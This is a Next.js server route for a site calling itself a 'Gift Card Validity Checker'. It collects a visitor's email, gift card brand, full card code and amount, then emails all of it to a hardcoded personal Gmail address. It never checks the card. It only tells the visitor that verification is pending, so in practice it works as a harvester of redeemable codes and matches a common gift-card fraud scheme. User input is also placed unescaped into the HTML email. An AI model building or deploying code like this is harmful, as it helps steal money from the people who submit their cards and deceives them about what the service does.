import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD,
  },
})

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      email,
      country,
      giftCard,
      cardCode,
      amount,
      currency,
      fileName,
    } = body

    // Validate required fields
    if (!email || !country || !giftCard || !cardCode || !amount || !currency) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    console.log('[v0] Processing verification request from:', email)

    // Create email content for admin
    const adminEmailContent = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { background: linear-gradient(135deg, #0099ff 0%, #0077cc 100%); color: white; padding: 30px; border-radius: 8px 8px 0 0; }
    .header h1 { margin: 0; font-size: 24px; }
    .content { background: #f9f9f9; padding: 30px; border-radius: 0 0 8px 8px; }
    .field { margin-bottom: 20px; padding: 15px; background: white; border-left: 4px solid #0099ff; }
    .label { font-weight: 600; color: #0099ff; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
    .value { margin-top: 8px; color: #333; font-size: 16px; word-break: break-all; }
    .divider { border-top: 1px solid #ddd; margin: 30px 0; }
    .footer { text-align: center; padding: 20px; color: #666; font-size: 12px; }
    .code { font-family: monospace; background: #f0f0f0; padding: 8px; border-radius: 4px; display: inline-block; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>New Gift Card Verification Request</h1>
      <p style="margin: 10px 0 0 0; opacity: 0.9;">A user has submitted a verification request</p>
    </div>
    <div class="content">
      <div class="field">
        <div class="label">User Email</div>
        <div class="value">${email}</div>
      </div>

      <div class="field">
        <div class="label">Country</div>
        <div class="value">${country}</div>
      </div>

      <div class="field">
        <div class="label">Gift Card Brand</div>
        <div class="value">${giftCard}</div>
      </div>

      <div class="field">
        <div class="label">Card Code</div>
        <div class="value"><span class="code">${cardCode}</span></div>
      </div>

      <div class="field">
        <div class="label">Amount</div>
        <div class="value">${amount} ${currency}</div>
      </div>

      ${fileName ? `
      <div class="field">
        <div class="label">File Attached</div>
        <div class="value">${fileName}</div>
      </div>
      ` : '<div class="field"><div class="label">File</div><div class="value">None</div></div>'}

      <div class="divider"></div>

      <p style="background: #e3f2fd; padding: 15px; border-radius: 6px; border-left: 4px solid #0099ff; margin: 0;">
        <strong>Action Required:</strong> Please verify this gift card and respond to the customer at ${email}
      </p>

      <div style="margin-top: 20px; padding: 15px; background: #f5f5f5; border-radius: 6px;">
        <p style="margin: 0; font-size: 12px; color: #666;">
          <strong>Timestamp:</strong> ${new Date().toLocaleString()}<br>
          <strong>Request ID:</strong> ${Math.random().toString(36).substring(7).toUpperCase()}
        </p>
      </div>
    </div>
    <div class="footer">
      <p>This is an automated notification from the Gift Card Validity Checker system.</p>
      <p>&copy; 2026 Gift Card Validity Checker. All rights reserved.</p>
    </div>
  </div>
</body>
</html>
    `

    console.log('[v0] Attempting to send email via Gmail...')
    console.log('[v0] Using Gmail account:', process.env.GMAIL_USER)

    // Send email to admin
    const mailOptions = {
      from: process.env.GMAIL_USER,
      to: 'grimesdarl4@gmail.com',
      subject: `New Gift Card Verification Request - ${giftCard}`,
      html: adminEmailContent,
      replyTo: email,
    }

    console.log('[v0] Mail options:', { from: mailOptions.from, to: mailOptions.to, subject: mailOptions.subject })

    const adminResponse = await transporter.sendMail(mailOptions)

    console.log('[v0] Admin email response:', adminResponse)

    if (!adminResponse.messageId) {
      console.error('[v0] Failed to send admin email. No messageId returned.')
      return NextResponse.json(
        { error: 'Failed to submit verification request. Please try again.' },
        { status: 500 }
      )
    }

    console.log('[v0] Email sent successfully! MessageId:', adminResponse.messageId)

    return NextResponse.json(
      {
        success: true,
        message: 'Verification request submitted successfully! We will contact you within 24 hours.',
        messageId: adminResponse.messageId,
      },
      { status: 200 }
    )
  } catch (error) {
    console.error('[v0] Error processing request:', error)
    return NextResponse.json(
      { error: 'Failed to process verification request' },
      { status: 500 }
    )
  }
}
